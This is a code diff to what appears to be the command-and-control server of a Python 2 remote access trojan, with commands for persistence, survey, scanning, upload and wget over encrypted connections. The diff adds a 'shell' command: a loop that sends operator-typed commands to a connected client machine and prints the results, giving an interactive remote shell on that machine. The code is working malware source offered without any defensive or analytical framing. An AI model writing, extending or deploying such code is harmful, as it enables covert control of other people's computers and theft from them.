@@ -48,7 +48,7 @@ upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
              'quit', 'rekey', 'run', 'scan', 'survey', 'unzip', 'upload',
-             'wget' ]
+             'wget', 'shell' ]
 
 
 class Server(threading.Thread):
@@ -136,11 +136,32 @@ class ClientConnection:
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
+        elif cmd == 'shell':
+            self.shell()
+
         # results of survey, persistence, unzip, or wget
         elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
             recv_data = self.conn.recv(1024)
             print crypto.AES_decrypt(recv_data, self.dh_key)
+
+    def shell(self):
+        while True:
+            recv_data = self.conn.recv(4096)
+            data = crypto.AES_decrypt(recv_data, self.dh_key).rstrip()
+
+            # Get current directory
+            cwd = data.split("|")[0]
+
+            # Get all other data
+            if data.split("|")[1] not in "":
+                print(data.split("|")[1])
+
+            prompt = raw_input('\n[BRShell]{}> '.format(cwd)).rstrip()
+            self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
+
+            if prompt == "exit":
+                break
 
 
 def get_parser():
